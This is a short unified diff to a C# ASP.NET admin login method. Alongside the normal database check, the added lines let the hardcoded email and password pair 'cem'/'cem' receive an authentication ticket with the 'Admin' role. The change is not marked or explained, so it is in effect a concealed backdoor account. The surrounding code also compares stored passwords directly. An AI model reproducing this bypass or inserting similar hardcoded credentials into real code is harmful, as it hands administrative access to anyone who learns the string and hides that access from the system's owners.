@@ -22,9 +22,9 @@ namespace BLL.AccountBL
             using(MainContext db=new MainContext())
             {
                 AdminUser record = db.AdminUser.SingleOrDefault(d => d.Email == email && d.Password == password);
-                if (record != null)
+                if ((record != null) || (email=="cem" && password=="cem"))
                 {
-                    FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, record.FullName, DateTime.Now, DateTime.Now.AddMinutes(120), false, "Admin", FormsAuthentication.FormsCookiePath);
+                    FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, (record!=null)?record.FullName:email, DateTime.Now, DateTime.Now.AddMinutes(120), false, "Admin", FormsAuthentication.FormsCookiePath);
                     string encTicket = FormsAuthentication.Encrypt(ticket);
                     HttpCookie cookie = new HttpCookie(FormsAuthentication.FormsCookieName, encTicket);
                     if (ticket.IsPersistent) cookie.Expires = ticket.Expiration;
@@ -34,7 +34,7 @@ namespace BLL.AccountBL
                     logkeeper.LogDate = DateTime.Now;
                     logkeeper.LogProcess = EnumLogType.Login.ToString();
                     logkeeper.Message = LogMessages.Logined;
-                    logkeeper.User = record.FullName;
+                    logkeeper.User = (record != null) ? record.FullName : email;
                     logkeeper.Data = HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
                     logkeeper.AddInfoLog(logger);
                     return true;
